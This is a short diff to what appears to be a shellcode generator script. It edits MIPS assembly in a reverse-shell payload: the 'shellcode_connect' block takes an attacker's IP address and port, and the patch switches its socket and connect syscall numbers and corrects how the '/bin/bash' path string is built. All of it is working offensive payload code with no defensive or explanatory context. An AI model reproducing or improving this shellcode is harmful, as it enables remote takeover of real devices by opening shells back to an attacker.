@@ -3188,7 +3188,7 @@ nor     $a0, $t9, $zero
 li      $t9, -3
 nor     $a1, $t9, $zero
 slti    $a2, $zero, -1
-li      $v0, 0x13b0
+li      $v0, 0x1798
 syscall 0x40404
 sw      $v0, -4($sp)
 lw      $s0, -4($sp)
@@ -3206,7 +3206,7 @@ lw      $a0, -4($sp)
 move     $a1,$sp
 li      $t9, -17
 nor     $a2, $t9, $zero
-li      $v0, 0x13b1
+li      $v0, 0x1799
 syscall 0x40404
 	'''
 	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
@@ -3265,7 +3265,7 @@ syscall 0x40404
 
 	elif shell_path == "/bin/bash" or shell_path == "bash":
 		shellcode += """
-lui     $t9, 0x96d2
+lui     $t1, 0x6e69
 ori     $t1, $t1, 0x622f
 sw      $t1, -12($sp)
 lui     $t1, 0x7361
